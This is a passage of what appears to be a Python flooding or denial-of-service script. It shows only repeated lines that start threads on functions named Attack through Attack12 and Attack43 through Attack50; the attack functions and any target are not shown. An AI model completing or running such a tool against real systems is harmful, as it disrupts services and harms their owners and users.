		th = threading.Thread(target = Attack43)
		th.start()
		th = threading.Thread(target = Attack44)
		th.start()
		th = threading.Thread(target = Attack45)
		th.start()
		th = threading.Thread(target = Attack46)
		th.start()
		th = threading.Thread(target = Attack47)
		th.start()
		th = threading.Thread(target = Attack48)
		th.start()
		th = threading.Thread(target = Attack49)
		th.start()
		th = threading.Thread(target = Attack50)
		th.start()
else:
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack6)
		th.start()
		th = threading.Thread(target = Attack7)
		th.start()
		th = threading.Thread(target = Attack8)
		th.start()
		th = threading.Thread(target = Attack9)
		th.start()
		th = threading.Thread(target = Attack10)
		th.start()
		th = threading.Thread(target = Attack11)
		th.start()
		th = threading.Thread(target = Attack12)
		th.start()